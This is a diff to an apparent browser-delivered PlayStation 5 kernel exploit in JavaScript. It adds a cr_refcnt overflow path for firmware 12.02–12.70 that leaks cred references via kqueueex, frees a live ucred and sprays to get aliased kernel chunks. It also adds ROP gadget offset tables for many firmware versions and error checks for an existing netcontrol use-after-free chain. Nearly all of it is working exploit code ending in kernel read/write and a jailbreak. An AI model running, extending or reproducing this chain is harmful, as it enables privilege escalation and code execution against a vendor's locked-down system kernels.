@@ -168,7 +168,13 @@ const TRIPLET_ATTEMPTS = 5000;
 /* 10000, matching Poops.java's leakKqueue() (`while (attempts < 10000)`).
  * This was 0x200 = 512 - twenty times short of the reference. */
 const KQUEUE_ATTEMPTS  = 10000;
-const REFCNT_ROUNDS    = 32;
+/* cr_refcnt reset: how many sendmsg allocate-write-free cycles to run between
+ * CLEAR_QUEUE and the double-free close. 0x80 is upstream's value (poops does
+ * exactly this loop). Was previously 32 rounds of iov WORKER sprays, which
+ * could not write cr_refcnt at all because those threads are unpinned and so
+ * allocate from a different core's UMA bucket than the one the ucred was freed
+ * into — see ucred_triple_free for the full reasoning. */
+const REFCNT_SENDMSG_N = 0x80;
 // poops.c spins these unbounded (`while (1)`). Bounded here so a lost race
 // reports instead of hanging the browser tab forever.
 /* Upstream runs BOTH of these as `while (true)` - unbounded. We keep a bound
@@ -404,12 +410,33 @@ const SYM = {
 //   see E:\ps5\dwarf\NETCTRL_RE\syscalls.py
 const SYSCALL_NUMS = {
     mprotect: 74n, sendmsg: 28n, read: 3n, write: 4n, close: 6n, getpid: 20n, setuid: 23n, recvmsg: 27n,
+    // getuid (24, confirmed in syscallnames[] on kernel_1000 and kernel_1200):
+    // reported alongside setuid so a privilege failure names itself instead of
+    // surfacing 512 rounds later as an unexplained self=all.
+    getuid: 24n,
     open: 5n, sys_dynlib_dlsym: 591n,
     dup: 41n, ioctl: 54n, munmap: 73n, socket: 97n, netcontrol: 99n,
     setsockopt: 105n, getsockopt: 118n, readv: 120n, writev: 121n,
     socketpair: 135n, sched_yield: 331n, kqueue: 362n, thr_exit: 431n,
     thr_self: 432n, thr_new: 455n, rtprio_thread: 466n, mmap: 477n,
     cpuset_setaffinity: 488n,
+    /* jitshm is how PS5 hands out executable memory without a W^X violation:
+     * create returns an exec-capable handle, alias returns a second handle to
+     * the same physical pages with different protections. Both numbers read out
+     * of syscallnames[] in kernel_1000 and kernel_1200 — identical, and the
+     * whole 9.00-12.00 window shares those two builds' tables. */
+    jitshm_create: 533n, jitshm_alias: 534n,
+    /* p2jb (12.02+) only. Both read out of syscallnames[] in kernel_1202 /
+     * 1220 / 1240 / 1260 / 1270 — identical across all five.
+     *   kqueueex(flags)  141 — the cred leak. sys_kqueueex crhold()s
+     *     td_ucred into kq->kq_cred (+0xF0) BEFORE it looks at the flags
+     *     argument, and the non-zero-flags path then errors out without ever
+     *     crfree()ing it. One leaked cr_ref per call; that is the whole bug.
+     *   poll(fds, nfds, timeout) 209 — the cr_refcnt reset spray, standing in
+     *     for netcontrol's sendmsg. nfds = UCRED_SIZE/8 = 45 makes sys_poll
+     *     allocate exactly 45*8 = 0x168 bytes, the ucred bucket, and copy the
+     *     caller's buffer into it (first u32 = 1 lands on cr_refcnt). */
+    kqueueex: 141n, poll: 209n,
     // There is no `pipe` in this kernel's syscallnames[] at all - Sony dropped
     // the arg-less form the way FreeBSD 10 did, leaving only pipe2(fildes,
     // flags), num 687 narg 2. Upstream poops gets away with the name "pipe"
@@ -425,6 +452,21 @@ const SYSCALL_NUMS = {
 // chain below never touches libc, so none of that matters here.
 //   syscall_wrapper lives in libkernel_web; everything else in libSceNKWebKit.
 //   see E:\ps5\dwarf\NETCTRL_RE\webkit_gadgets.py
+//
+// EXTENDED 09.00..12.00 — the full netcontrol window. The eight new rows
+// (10.20 10.40 10.60 11.00 11.20 11.40 11.60 12.00) came out of the retail
+// libSceNKWebKit.sprx / libkernel_web.sprx in the system_ex database by the
+// same rule the six hand-made rows already followed: take the FIRST occurrence
+// of the gadget's byte pattern inside the module's executable PT_LOAD. That
+// rule was not assumed — it was checked first, and it reproduces all 54
+// pre-existing 09.00/09.20/09.40/09.60/10.00/10.01 values byte for byte, which
+// is what makes the new rows trustworthy. Every RVA below was then disassembled
+// and string-compared against the gadget it claims to be (182 gadgets, zero
+// mismatches), so none of these is a pattern that happens to sit in a data pool.
+//
+// 10.20/10.40/10.60 being identical to 10.00 and 11.40/11.60 identical to 11.20
+// is real, not a copy-paste: those builds ship the same WebKit binary, and
+// offsets.json's independent hc/gd anchors group them the same way.
 const GADGETS = {
     "09.00": { mov_rsp_rbp: 0x2b1bbcan, pivot_rdi_rsp: 0x2b1bdaen, pop_r8: 0x1d1992fn,
                pop_rax: 0x2661dn, pop_rcx: 0x19f15n, pop_rdi: 0x17324dn,
@@ -444,6 +486,45 @@ const GADGETS = {
     "10.01": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
                pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
                pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.20": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.40": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "10.60": { mov_rsp_rbp: 0x2d18e0an, pivot_rdi_rsp: 0x2d18feen, pop_r8: 0x17daf73n,
+               pop_rax: 0x45b53n, pop_rcx: 0x24d8dn, pop_rdi: 0x5fc4en,
+               pop_rdx: 0x106760n, pop_rsi: 0x1027fan, syscall_wrapper: 0x1a5b7n },
+    "11.00": { mov_rsp_rbp: 0x2c56fean, pivot_rdi_rsp: 0x2c571cen, pop_r8: 0x1d8488fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x1b46d9n,
+               pop_rdx: 0x10f32n, pop_rsi: 0x67b64n, syscall_wrapper: 0x1a8d7n },
+    "11.20": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "11.40": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "11.60": { mov_rsp_rbp: 0x2c5746an, pivot_rdi_rsp: 0x2c5764en, pop_r8: 0x1d84d0fn,
+               pop_rax: 0xd53n, pop_rcx: 0x2b555n, pop_rdi: 0x4575bn,
+               pop_rdx: 0x10f32n, pop_rsi: 0x45a94n, syscall_wrapper: 0x1a8d7n },
+    "12.00": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.02": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.20": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae27n },
+    "12.40": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
+    "12.60": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
+    "12.70": { mov_rsp_rbp: 0x2c6f3ean, pivot_rdi_rsp: 0x2c6f5cen, pop_r8: 0x716bn,
+               pop_rax: 0x6eccn, pop_rcx: 0x6cfan, pop_rdi: 0x5a469n,
+               pop_rdx: 0x196067n, pop_rsi: 0x16b03an, syscall_wrapper: 0x1ae47n },
 };
 
 // Runtime keys to fall back on when a number is missing. `pipe` used to be
@@ -458,6 +539,9 @@ const SYSFALLBACK = {
     rtprio_thread: "rtprio_thread",
     dup: null, ioctl: null, kqueue: null, setuid: null,
     readv: null, writev: null, recvmsg: null, netcontrol: null,
+    // elfldr-only, and only reached long after the race; RE'd numbers, no
+    // libc name to fall back to (nothing resolves libc on this chain anyway)
+    jitshm_create: null, jitshm_alias: null,
 };
 
 /* Every syscall goes through rop-worker's SYNCHRONOUS path.
@@ -547,6 +631,9 @@ const sys = {
     close(fd)  { return invoke("close", S(fd)); },
     dup(fd)    { return invoke("dup", S(fd)); },
     setuid(u)  { return invoke("setuid", S(u)); },
+    getuid()   { return invoke("getuid"); },
+    open(path, flags, mode) { return invoke("open", BigInt(path), S(flags), S(mode)); },
+    poll(fds, nfds, timeout) { return invoke("poll", BigInt(fds), S(nfds), S(timeout)); },
     getpid()   { return invoke("getpid"); },
     kqueue()   { return invoke("kqueue"); },
     sched_yield() { return invoke("sched_yield"); },
@@ -970,10 +1057,17 @@ function barrier_iov() {
 //
 // lapse.js's init_threading() builds its thread on start_func = longjmp with a
 // prepared jmpbuf. Those symbols come from slopkit's lapse-offsets.json, whose
-// setjmp/longjmp entries point at DATA, not code — verified against
+// setjmp/longjmp entries pointed at DATA, not code — verified against
 // libkernel_web, libkernel, libkernel_sys and libSceLibcInternal on both 10.00
 // and 11.60. The console's own log agrees: LIBC-BASE-0xNaN, equations=0. So
 // that path executes into nothing and takes the renderer with it.
+//
+// (lapse-offsets.json no longer carries bad values — every firmware's
+// setjmp/longjmp is now recovered by matching the real function prologue in
+// libkernel_web and disassembles correctly. That does NOT resurrect the libc
+// path: this spawner is kept because it needs no libc at all, which is a
+// stronger property than having the two symbols be right. The note is left
+// standing so nobody "fixes" the offsets and assumes init_threading is usable.)
 //
 // The trick that avoids libc entirely: thr_new invokes start_func(arg) with
 // rdi = arg. Point start_func at `mov rsp, rdi; ret` and the new thread's stack
@@ -1005,9 +1099,19 @@ const rop = {
     },
 
     g(name) {
-        const rva = GADGETS[this.fwkey][name];
+        /* EXTRA_GADGETS is consulted too, not just GADGETS.
+         *
+         * gadgetsFor() already merges the two for rop-worker, but rop.g did
+         * not — so anything only in EXTRA_GADGETS (mov_qword_rdi_rax, and the
+         * mov_rax_deref_rdi / inc_rax that p2jb's counter needs) threw
+         * "gadget missing" when a chain built here asked for it. Both tables
+         * are libSceNKWebKit-relative, so the base rule is unchanged. */
+        const rva = GADGETS[this.fwkey][name] !== undefined
+                  ? GADGETS[this.fwkey][name]
+                  : (EXTRA_GADGETS[this.fwkey] || {})[name];
         if (rva === undefined)
-            throw new Error("netctrl-ps5: gadget '" + name + "' missing");
+            throw new Error("netctrl-ps5: gadget '" + name + "' missing for fw "
+                            + this.fwkey);
         // syscall_wrapper is the only one from libkernel_web
         return (name === "syscall_wrapper" ? this.lk : this.wk) + rva;
     },
@@ -1325,6 +1429,19 @@ function init() {
     ST.leak_len_ptr = mem.alloc(8);
 
     ST.msg_hdr = mem.alloc(MSG_HDR_SIZE);
+    /* Zero the whole msghdr, not just the two fields we set below.
+     *
+     * mem.alloc does not zero (see the note under msg_iov), so msg_name and
+     * msg_namelen carried stack garbage. That was harmless while this header
+     * was only ever handed to recvmsg on the worker threads, but the cr_refcnt
+     * reset now uses sendmsg, and sendit() dereferences msg_name whenever it is
+     * non-NULL: a garbage pointer with a garbage length means an extra
+     * getsockaddr copyin on every one of the 128 spray calls, and for any
+     * length <= SOCK_MAXADDRLEN a stray malloc alongside it. The iovec spray
+     * would still happen either way, but not cleanly and not identically each
+     * time — and this loop's whole job is to land the same allocation on the
+     * same freed chunk over and over. */
+    mem.bset(ST.msg_hdr, MSG_HDR_SIZE, 0);
     ST.msg_iov = mem.alloc(0x10 * MSG_IOV_NUM);
 
     /* mem.alloc is rop-worker's bump allocator over the Worker stack and does
@@ -1522,6 +1639,304 @@ function find_twins() {
  * between separate syscalls (the self=all cause; RE: uma_zalloc curcpu<<6, and
  * the batched calls are all M_NOWAIT so the worker never parks mid-chain). Falls
  * back to the per-round find_twins() loop if the single batched round misses. */
+/* ==========================================================================
+ * p2jb — cr_refcnt overflow.  For 12.02 .. 12.70, where netcontrol is fixed.
+ *
+ * Ported from ufm42/cobolt's p2jb.js. Only the ROUTE TO THE DOUBLE FREE differs
+ * from the netcontrol chain; everything downstream — find_twins, find_triplet,
+ * leak_kqueue, make_karw, find_allproc, ps5_jailbreak, the elfldr loader — is
+ * shared, because both exploits end at the same place: one ucred chunk sitting
+ * on the free list more than once.
+ *
+ * The bug (verified in kernel_1202, sys_kqueueex @0xFFFFFFFF805D4CC0):
+ *   malloc(0x128) the kqueue, then
+ *     mov rdi, r14        ; r14 = td_ucred
+ *     call crhold
+ *     mov [r15+0xF0], rax ; kq->kq_cred
+ *     mov r14, [r13]      ; r13 = uap  ->  the flags argument
+ *     test r14, r14
+ *     je  ...             ; non-zero flags take a path that errors out
+ *   and that error path never crfree()s kq_cred. So each kqueueex(non-zero)
+ *   leaks exactly one cred reference and allocates nothing that has to be
+ *   cleaned up.
+ *
+ * Drive cr_refcnt to 0xFFFFFFB0, open 0x50 files (each crhold's, +0x50) so it
+ * wraps to exactly 0, then setuid(1). FreeBSD's refcount_release treats old<=1
+ * as "last reference", so releasing at 0 FREES the ucred while 0x50 files still
+ * point at it — and every subsequent close() frees it again.
+ *
+ * Cost: 0xFFFFFFB0 is ~4.29 BILLION syscalls. cobolt spends ~50 minutes on it
+ * with four pinned threads and says so up front; this is not a fast path and
+ * there is no way to make it one.
+ * ====================================================================== */
+
+/* The three kernel bugs partition the supported range exactly — every firmware
+ * belongs to one and only one of them, so routing is a set lookup rather than a
+ * comparison. 13.x is absent from all three: nothing here has been checked
+ * against those kernels.
+ *
+ *   lapse    09.00 - 10.01   aio double free      (lapse-ps5.js)
+ *   netctrl  10.20 - 12.00   netcontrol UAF       (this file)  [aka "poops"]
+ *   p2jb     12.02 - 12.70   cr_refcnt overflow   (this file)
+ */
+const LAPSE_FIRMWARES_KERNEL =
+    new Set(["09.00", "09.20", "09.40", "09.60", "10.00", "10.01"]);
+const NETCTRL_FIRMWARES =
+    new Set(["10.20", "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"]);
+const P2JB_FIRMWARES = new Set(["12.02", "12.20", "12.40", "12.60", "12.70"]);
+const sk_fw = () => String((window.slopkit && window.slopkit.FW_VERSION) || "");
+
+const P2JB_TARGET      = 0xFFFFFFB0n;   // cr_refcnt value to stop at
+const P2JB_NUM_FDS     = 0x50;          // opens that carry it across the wrap
+const P2JB_THREADS     = 4;
+const P2JB_CALLS_PASS  = 0x200;         // kqueueex calls per loop pass
+const KQUEUEEX_FLAG    = 0x800000000000n;
+const P2JB_FINE_BATCH  = 0x800;         // top-up batch size, main thread
+const O_RDONLY         = 0;
+
+/* One self-looping ROP chain per spinner thread.
+ *
+ * cobolt's loop branches inside the chain with `cmovb rax, rsi` + `xchg rsp,
+ * rax`, and counts with `lock xadd [rdi], rax`. None of those exist in
+ * libSceNKWebKit or libkernel_web on ANY firmware — scanned for lock xadd,
+ * xadd, add [rdi],rax, inc qword [rdi], cmovb, xchg rsp,rax and sub rdx,rax:
+ * zero hits. So the loop is rebuilt from what we do have:
+ *
+ *   loop-back   `pop rdi, <addr>; mov rsp, rdi; ret`  — the pivot lands rsp on
+ *               the loop head and the ret enters it. The <addr> is an immediate
+ *               IN the chain, so the main thread stops the loop by overwriting
+ *               that one qword with the exit stub's address. A single aligned
+ *               store the chain only ever reads; the thread sees either the old
+ *               or the new value and both are valid.
+ *   counter     load / inc / store via mov_rax_deref_rdi + inc_rax +
+ *               mov_qword_rdi_rax. Non-atomic, which is fine because each
+ *               thread owns its own counter — the main thread sums them.
+ *
+ * Counting PASSES rather than calls keeps the counter overhead at 5 gadgets per
+ * P2JB_CALLS_PASS syscalls instead of per syscall. */
+function p2jbBuildSpinner(slot) {
+    const c = slot.chain;
+    let o = 0n;
+    const put = (v) => { wr64at(c, o, BigInt(v)); o += 8n; };
+    const g = (n) => rop.g(n);
+
+    // pin + realtime, exactly as the iov/uio spray threads do. Here it is not
+    // optional: the whole point is four threads each saturating one core.
+    put(g("pop_rdi")); put(BigInt(CPU_LEVEL_WHICH));
+    put(g("pop_rsi")); put(BigInt(CPU_WHICH_TID));
+    put(g("pop_rdx")); put(0xFFFFFFFFFFFFFFFFn);
+    put(g("pop_rcx")); put(BigInt(CPU_SET_SIZE));
+    put(g("pop_r8"));  put(slot.mask);
+    put(g("pop_rax")); put(SYSCALL_NUMS.cpuset_setaffinity);
+    put(g("syscall_wrapper"));
+    put(g("pop_rdi")); put(BigInt(RTP_SET));
+    put(g("pop_rsi")); put(0n);
+    put(g("pop_rdx")); put(ST.rtp);
+    put(g("pop_rax")); put(SYSCALL_NUMS.rtprio_thread);
+    put(g("syscall_wrapper"));
+
+    const loopHead = BigInt(c) + o;          // where the pivot must land
+
+    for (let i = 0; i < P2JB_CALLS_PASS; i++) {
+        put(g("pop_rax")); put(SYSCALL_NUMS.kqueueex);
+        put(g("pop_rdi")); put(KQUEUEEX_FLAG);
+        put(g("syscall_wrapper"));
+    }
+
+    // counter += 1  (per pass)
+    put(g("pop_rdi")); put(slot.counter);
+    put(g("mov_rax_deref_rdi"));
+    put(g("inc_rax"));
+    put(g("pop_rdi")); put(slot.counter);
+    put(g("mov_qword_rdi_rax"));
+
+    // loop back — this immediate is the stop switch
+    put(g("pop_rdi"));
+    slot.loopSlot = BigInt(c) + o;           // main thread patches HERE
+    put(loopHead);
+    put(g("pivot_rdi_rsp"));
+
+    // exit stub, jumped to when loopSlot is repointed at it
+    slot.exitAddr = BigInt(c) + o;
+    put(g("pop_rax")); put(SYSCALL_NUMS.thr_exit);
+    put(g("pop_rdi")); put(0n);
+    put(g("syscall_wrapper"));
+
+    slot.chainBytes = Number(o);
+    slot.loopHead = loopHead;
+    return slot;
+}
+
+function p2jbSpin() {
+    const slots = [];
+    // Chain size is fixed by P2JB_CALLS_PASS; allocate from the same worker
+    // stack arena everything else uses, before the KRW stage has eaten it.
+    const chainBytes = (P2JB_CALLS_PASS * 5 + 64) * 8;
+    for (let i = 0; i < P2JB_THREADS; i++) {
+        const mask = mem.alloc(CPU_SET_SIZE);
+        mem.bset(mask, CPU_SET_SIZE, 0);
+        wr32at(mask, 0x00, 1 << i);            // one thread per core, 0..3
+        const slot = {
+            mask: BigInt(mask),
+            counter: BigInt(mem.alloc(8)),
+            chain: mem.alloc(chainBytes),
+            param: mem.alloc(THR_PARAM_SIZE),
+            stack: mem.alloc(THR_STACK_SIZE),
+            tid: mem.alloc(0x18),
+        };
+        R.wr64(slot.counter, 0n);
+        mem.bset(slot.tid, 0x18, 0);
+        p2jbBuildSpinner(slot);
+        slots.push(slot);
+    }
+
+    for (const s of slots) {
+        const p = s.param;
+        mem.bset(p, THR_PARAM_SIZE, 0);
+        wr64at(p, 0x00, rop.g("pivot_rdi_rsp"));   // start_func: rsp := arg
+        wr64at(p, 0x08, BigInt(s.chain));          // arg -> rdi -> the chain
+        wr64at(p, 0x10, s.stack);
+        wr64at(p, 0x18, BigInt(THR_STACK_SIZE));
+        wr64at(p, 0x30, s.tid);
+        wr64at(p, 0x38, s.tid);
+        const rv = invoke("thr_new", p, BigInt(THR_PARAM_SIZE));
+        if (rv !== 0) throw new Error("p2jb: thr_new -> " + rv);
+    }
+    beacon("p2jb spinners=" + P2JB_THREADS + " calls/pass=0x"
+           + P2JB_CALLS_PASS.toString(16) + " target=" + hex(P2JB_TARGET));
+
+    const total = () => {
+        let n = 0n;
+        for (const s of slots) n += R.rd64(s.counter);
+        return n * BigInt(P2JB_CALLS_PASS);
+    };
+
+    /* Stop early enough that no thread can overshoot the target while
+     * finishing the pass it is already in: worst case every thread is one full
+     * pass from committing. The exact remainder is issued from this thread
+     * afterwards, where the count is precise. */
+    const slack = BigInt(P2JB_THREADS * P2JB_CALLS_PASS * 2);
+    const stopAt = P2JB_TARGET - slack;
+    const t0 = Date.now();
+    let lastLog = 0n;
+    for (;;) {
+        const n = total();
+        if (n >= stopAt) break;
+        const step = n >> 24n;
+        if (step !== lastLog) {
+            lastLog = step;
+            const el = (Date.now() - t0) / 1000;
+            beacon("p2jb cr_refcnt~" + hex(n) + " " + Math.round(el) + "s"
+                   + " rate=" + Math.round(Number(n) / Math.max(el, 1)) + "/s");
+        }
+    }
+
+    // flip every loop-back to the exit stub, then wait for the threads to go
+    for (const s of slots) R.wr64(s.loopSlot, s.exitAddr);
+    for (let i = 0; i < 4000000; i++) {
+        let live = 0;
+        for (const s of slots) if (rd64at(s.tid, 0x10) === 0n) live++;
+        if (!live) break;
+    }
+    const done = total();
+    beacon("p2jb spinners stopped at " + hex(done) + " after "
+           + Math.round((Date.now() - t0) / 1000) + "s");
+    return done;
+}
+
+/* Issue the exact remainder from this thread, where every call is counted. */
+function p2jbTopUp(from) {
+    let n = from;
+    while (n < P2JB_TARGET) {
+        const want = Number(P2JB_TARGET - n);
+        const k = Math.min(want, P2JB_FINE_BATCH);
+        const batch = [];
+        for (let i = 0; i < k; i++)
+            batch.push([Number(SYSCALL_NUMS.kqueueex), KQUEUEEX_FLAG]);
+        window.rop_worker.syscallBatch(batch);
+        n += BigInt(k);
+    }
+    beacon("p2jb topped up to " + hex(n));
+    return n;
+}
+
+function ucred_triple_free_p2jb() {
+    log("p2jb: cr_refcnt overflow");
+
+    /* poll's spray buffer: nfds = UCRED_SIZE/8 makes sys_poll allocate exactly
+     * UCRED_SIZE and copy this in, so byte 0 = 1 lands on cr_refcnt. */
+    const nfds = UCRED_SIZE / 8;
+    const pollbuf = mem.alloc(UCRED_SIZE);
+    mem.bset(pollbuf, UCRED_SIZE, 0);
+    wr32at(pollbuf, 0x00, 1);
+    const resetRefcnt = (rounds) => {
+        const batch = [];
+        for (let i = 0; i < rounds; i++)
+            batch.push([Number(SYSCALL_NUMS.poll), BigInt(pollbuf), S(nfds), 0n]);
+        window.rop_worker.syscallBatch(batch);
+    };
+
+    const uid0 = sys.getuid();
+    const su = sys.setuid(1);                      // fresh ucred to overflow
+    beacon("p2jb setuid uid=" + uid0 + " -> " + su);
+    if (su !== 0)
+        throw new Error("ERR_P2JB: setuid(1) failed (" + su + ") from uid " + uid0);
+
+    const spun = p2jbSpin();
+    p2jbTopUp(spun);
+
+    // Each open crhold()s the cred; 0x50 of them carry 0xFFFFFFB0 to 0 exactly.
+    const path = mem.alloc(0x20);
+    mem.bset(path, 0x20, 0);
+    const s = "/dev/null";
+    for (let i = 0; i < s.length; i++) R.wr8(BigInt(path), i, s.charCodeAt(i));
+    const fds = [];
+    for (let i = 0; i < P2JB_NUM_FDS; i++) {
+        const fd = sys.open(path, O_RDONLY, 0);
+        if (fd < 0) throw new Error("ERR_P2JB: open(/dev/null) -> " + fd);
+        fds.push(fd);
+    }
+    beacon("p2jb opened " + fds.length + " fds; cr_refcnt should have wrapped to 0");
+
+    // Release at 0 -> refcount_release sees old <= 1 -> frees a LIVE ucred.
+    const su2 = sys.setuid(1);
+    beacon("p2jb setuid#2 -> " + su2 + " (frees the still-referenced ucred)");
+    if (su2 !== 0) throw new Error("ERR_P2JB: setuid#2 failed " + su2);
+
+    try { sessionStorage.setItem("netctrl_dirty", "1"); } catch (e) {}
+
+    /* Each close() frees the same chunk again. Reset cr_refcnt to 1 around each
+     * one and look for twins; cobolt walks the fd list the same way because any
+     * single close may or may not be the one that surfaces an aliased pair. */
+    while (fds.length) {
+        const fd = fds.pop();
+        try {
+            resetRefcnt(0x20);
+            if (sys.close(fd) !== 0) continue;
+            resetRefcnt(0x20);
+            if (find_twins()) {
+                beacon("p2jb twins " + ST.twins.join("/") + " (fd " + fd + ")");
+                ST.triplets[0] = ST.twins[0];
+                free_rthdr(ST.ipv6_socks[ST.twins[1]]);
+                resetRefcnt(0x20);
+                const fd1 = fds.pop();
+                if (fd1 !== undefined) sys.close(fd1);   // the third free
+                const t1 = find_triplet(ST.triplets[0], -1);
+                if (t1 < 0) throw new Error("ERR_P2JB: triplet[1] not found");
+                ST.triplets[1] = t1;
+                const t2 = find_triplet(ST.triplets[0], ST.triplets[1]);
+                if (t2 < 0) throw new Error("ERR_P2JB: triplet[2] not found");
+                ST.triplets[2] = t2;
+                beacon("p2jb triplets " + ST.triplets.join("/"));
+                return true;
+            }
+        } catch (e) {
+            beacon("p2jb fd " + fd + ": " + e.message);
+        }
+    }
+    throw new Error("ERR_P2JB: no twins after closing all " + P2JB_NUM_FDS + " fds");
+}
+
 function doubleFreeAndFindTwins() {
     /* A single batched free+spray round was tried and REVERTED: RE (uma_zfree
      * bucket push @0x8068B8E0) showed the freed ucred lands in the free-core's
@@ -1535,7 +1950,18 @@ function doubleFreeAndFindTwins() {
     // Immediate find_twins, no settle between - matches upstream BD-JB5
     // Poops.java (close(dup(uafSock)) then findTwins() with no delay). The real
     // lever is TWIN_ATTEMPTS=5000 (restored above), not a settle.
-    sys.close(sys.dup(ST.uaf_sock));               // the double free
+    /* dup's result was discarded as well. If it returns -1 (uaf_sock already
+     * torn down, or the fd table in an unexpected state) then close(-1) is a
+     * no-op, nothing is freed, and find_twins grinds against a chunk that was
+     * never released — self=all again, with nothing in the log to say why.
+     * Upstream checks it; the cost here is one comparison. */
+    const dupfd = sys.dup(ST.uaf_sock);
+    if (dupfd < 0) {
+        beacon("double free: dup(" + ST.uaf_sock + ") -> " + dupfd);
+        throw new Error("ERR_TRIPLE_FREE: dup(uaf_sock) returned " + dupfd
+                        + " — nothing was freed, so no twins can exist");
+    }
+    sys.close(dupfd);                              // the double free
     return find_twins();
 }
 
@@ -1625,9 +2051,32 @@ function ucred_triple_free() {
     log("SET_QUEUE slot=" + slot);
 
     sys.close(dummy_sock);
-    sys.setuid(1);                               // allocate a fresh ucred
+
+    /* setuid's RESULT is load-bearing and was being discarded.
+     *
+     * Both calls exist for their allocator side effects: sys_setuid crget()s a
+     * new ucred, swaps it in, and crfree()s the old one. That only happens on
+     * SUCCESS. On EPERM it allocates a cred, fails the privilege check, frees
+     * the cred it just made, and leaves the process cred untouched — so no
+     * fresh ucred is installed, uaf_sock's f_cred stays the shared process cred
+     * with a large refcnt, and the close(dup(...)) later decrements it from N to
+     * N-1 without ever freeing anything. There is then no double free, no
+     * aliased chunk, and find_twins reports exactly what we are seeing:
+     * self=all, forever, at any attempt count.
+     *
+     * The reference implementation throws on -1 for both of these; we did not
+     * check either, so a privilege failure here was indistinguishable from a
+     * lost race. Check them, and report the uid either way. */
+    const uid0 = sys.getuid();
+    const su1 = sys.setuid(1);                   // allocate a fresh ucred
     ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
-    sys.setuid(1);                               // free the previous one
+    const su2 = sys.setuid(1);                   // free the previous one
+    beacon("setuid uid_before=" + uid0 + " setuid#1=" + su1 + " setuid#2=" + su2
+           + " uid_now=" + sys.getuid());
+    if (su1 !== 0 || su2 !== 0)
+        throw new Error("ERR_TRIPLE_FREE: setuid(1) failed (" + su1 + "/" + su2
+                        + ") from uid " + uid0 + " — no fresh ucred is allocated,"
+                        + " so there is nothing to double free");
 
     /* HARD PRECONDITION, and until now an unchecked one.
      *
@@ -1668,25 +2117,56 @@ function ucred_triple_free() {
     wr32at(clear_buf, 0, ST.uaf_sock);
     // -1, as upstream does in BOTH branches; the work function searches all
     // three slots by ID itself, so naming one is unnecessary and divergent.
-    sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
+    /* CLEAR_QUEUE's result was discarded too, and it is THE step that performs
+     * the double f_count drop. Its work function returns non-zero (5) when no
+     * slot matches the ID, and the handler then skips the first decrement
+     * entirely — one drop instead of two, no imbalance, no double free. That is
+     * the same silent dead end as a failed setuid, and it looks identical from
+     * find_twins. A non-zero return here is not survivable, so say so. */
+    const clr = sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
+    beacon("CLEAR_QUEUE -> " + clr + " (fd " + ST.uaf_sock + ")");
+    if (clr !== 0)
+        throw new Error("ERR_TRIPLE_FREE: CLEAR_QUEUE returned " + clr
+                        + " — the slot did not match, so only one f_count drop "
+                        + "happened and there is no double free");
     log("CLEAR_QUEUE done");
 
-    for (let i = 0; i < REFCNT_ROUNDS; i++) {
-        threads.signal("iov");
-        /* First round only: did the spawn chain actually create threads?
-         * The pinning chain added cpuset_setaffinity + rtprio_thread before
-         * the blocking syscall, so if either faults - or thr_new rejects the
-         * longer chain - the iov spray silently stops existing, cr_refcnt is
-         * never corrected, and find_twins cannot form a pair. That would look
-         * exactly like the 5000-round twins exhaustion we just saw, with no
-         * fault anywhere near find_twins itself. spawn=0 or live=0 here
